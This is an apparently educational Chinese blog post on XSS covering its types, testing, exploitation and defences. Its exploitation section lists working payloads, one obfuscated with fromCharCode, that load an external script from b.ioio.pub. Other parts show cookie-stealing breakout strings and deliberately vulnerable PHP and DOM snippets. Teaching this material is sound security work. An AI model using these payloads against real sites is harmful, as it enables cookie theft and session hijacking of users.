---
draft: false
date: 2016-07-15 10:30:54
title: XSS 漏洞及其挖掘方法
description: 
categories:
  - Pentest
tags:
  - xss
---

### 0x00 简介
XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在"脚本"这两个字上，脚本主要有两个：JavaScript和ActionScript。  
<f>要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。</f>

### 0x01 危害
JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。
```
• 盗取管理员Cookie
• XSS Worm
• 挂马(水坑攻击)
• 键盘记录(有局限性)
• 利用网站重定向
• 修改网页内容
• 等等
```

### 0x02 攻击场景
在各类SNS、邮件系统、开源流行的Web应用、BBS、微博等社交场景中，前端攻击被广泛实施与关注。主要是一些大型网站才有价值。
```
• 支持html解析和javascript解析的客户端,如：html文档、flsh、pdf等
• url的参数，回显到网页上
• form表单提交的内容出现在网页上，如：昵称、邮箱、简介、留言
• 等等
```

### 0x03 分类
主要分为三类：反射型、存储型、DOM型(还有flash XSS、mXSS)。   

* 反射型XSS  

反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。
```
简单流程：
1. 用户访问带有XSS代码的URL请求
2. 服务器端接收数据后处理，然后返回带有XSS代码的数据发送给浏览器
3. 浏览器解析带有XSS代码的数据后，最终造成XSS漏洞

可能攻击流程：
1. 用户aaa在网站www.xxx.com浏览网页
2. 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码，
3. 构造的代码的功能为盗取用户Cookie并发送到指定站点www.xxser.com
4. hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击
5. 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com
6. hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息
```

* 存储型XSS  

存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。
```
测试技巧：
1. 首先确定输入点和输出点，比如留言，若留言输出(显示)的地方是标签内，则XSS代码会被执行，但若输出在属性内，则不会执行，如：<input type="text" name="content" value="<script>alert(/xss/)</script>" />

2. 确定输出点后根据相应的标签构造HTML代码来闭合，如：" /><script>alert(1)</script><"，最终在html中为：<input type="text" name="content" value="" /><script>alert(1)</script><"" />

测试步骤：
1. 添加正常留言，用firebug快速查找显示标签，若显示区域不在html属性内则可以直接使用XSS代码注入

2. 若不能得知内容输出的位置，可以使用模糊测试方案，XSS代码如下：
    a. <script>alert(document.cookie)</script> //普通注入
    b. " /><script>alert(document.cookie)</script> //闭合标签注入
    c. </textarea>'"><script>alert(document.cookie)</script> //闭合标签注入
```

* DOM XSS

DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事情。
```
DOM的规定如下：
• 整个文档是一个文档节点
• 每个HTML标签是一个元素节点
• 包含在HTML元素中的文本是文本节点
• 每个HTML属性是一个属性节点
• 节点与节点之间都有等级关系
```
HTML的标签都是一个个节点，这些节点组成了DOM的整体结构：节点树，如下图：
![xss中DOM树](/img/post/xss_dom_tree.png)

* flash XSS

利用网页上flash文件的缺陷来执行js脚本，一般是反射型XSS。  
flash文件可以实现一些功能，如google的mail域下的sound.swf是用来播放声音的，uploaderapi2.swf是上传文件, audio.swf是播放音频文件。  
如：```https://mail.google.com/mail/html/audio.swf?videoUrl=aa.mp4```，audio.swf文件就是从videoUrl接收参数然后进行播放。
```
#现有flash文件aa.swf，源码如下：
var func:String=root.loaderInfo.parameters.func; //接受FLASH所带的func参数
var val:String=root.loaderInfo.parameters.val; //接受FLASH所带的vul参数
ExternalInterface.call(func,vul);

#当访问http://localhost/aa.swf?func=alert&vul="document.domain"时就会弹窗域名
```

### 0x04 XSS的检测
检测XSS一般分两种方法：一种是手工检测、一种是软件自动检测  
手工检测：检测结果准确，但对于大型web来说费时费力  
软件检测：方便省力，但存在误报，且有些隐蔽的XSS无法检测出  
<f>检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出</f>

* 手工检测
```
可得知输出位置:
    • 输入敏感字符，如<、>、"、'、()等，然后在提交后查看html源代码，看这些字符是否被转义。
    • 在输出这些字符时，程序可能已经进行了过滤，可以输入“AAAAAA<>"&'()”字符串，然后查找AAAAAA或许比较方便。
无法得知输出位置:
    很多web应用程序源码不公开，在测试时不能得知输出位置，比如，有些留言版在留言后必须经过管理员审核才能显示，无法得知数据在后台管理页面处于何种状态，如：
    在标签中：<div>XSS Test</div>
    在属性内：<input type="text" name="content" value="XSS Test" />
    这种情况通常采用输入"/>XSS Test来测试。
```

* 全自动检测XSS
如APPSCAN、AWVS、Burp Suite等软件都可以有效的检测XSS，他们还会检测其他的漏洞，但是他们的效率不如专业的XSS检测工具高。  
专业的XSS扫描工具有知名的XSSER、XSSF等，还有专门扫描DOM类型XSS的web服务(```www.domxssscanner.com```)。  
一般要手工和软件一起使用，因为有些XSS软件不能检测，比如有些留言需要输入验证码等，工具无法做到。

### 0x05 XSS的挖掘与利用
* XSS漏洞挖掘
```
反射型XSS：
    一般是url参数中的值能够回显到HTML中，且url的参数值没有过滤或过滤不严
存储型XSS：
    可以提交内容
    提交的内容可被管理员或其他用户看到
    提交的内容没有被过滤或过滤不严
```

* XSS漏洞利用
XSS一般就是闭合标签，和SQL注入类似，常见payload如下：
```
• <script src='http://b.ioio.pub/xss/probe.js'></script>
• <img src=x onerror="s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js'";>
• <svg onload=s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js>
• <svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,
    114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,
    115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47,
    112,114,111,98,101,46,106,115)) >
```

### 0x06 XSS简单示例
```
反射型xss简单示例:
    • <?php
          echo $_GET['x'];
      ?>
    • 提交：
      /xss.php?x=<script>alert(1)</script>
    • 服务端解析时就会触发弹窗
```
```
下面是一段简单的DOM型XSS示例：
<script>
    var temp = document.URL; //获取URL
    var index = document.URL.indexOf("content");
    var par = temp.substrint(index);
    document.write(decodeURL(par)); //输入获取内容
</script>
上述代码的意思是获取URL中content参数的值，并且输出，若输入http://www.xxx.com/dom.html?content=<script>alert(/xss/)</script>，就会产生XSS漏洞。
```
```
只要在script标签中添加JavaScript代码，就能实现一些“特殊效果”，但通常在真实攻击中
一般使用<script src="http://www.xxx.com/a.txt"></script>的方式来加载外部脚本，
a.txt中就存放着恶意脚本。

注：JavaScript加载的脚本文件可以是任意扩展名，甚至没有也行，只要加载的文件中含有
    JavaScript代码就会被执行。
```

### 0x07 XSS的防御
* 过滤输入与输出(重点)

使用htmlspecialchars()和htmlentities()将一些预定义的字符转换为HTML实体
```
<?php
    @$html = $_GET['x'];
    if ($html){
        echo htmlspecialchars($html);
    }
?>
```

* HttpOnly

```
HttpOnly并不能防御XSS，但它能解决XSS漏洞后面的Cookie劫持攻击，防止XSS会话劫持
```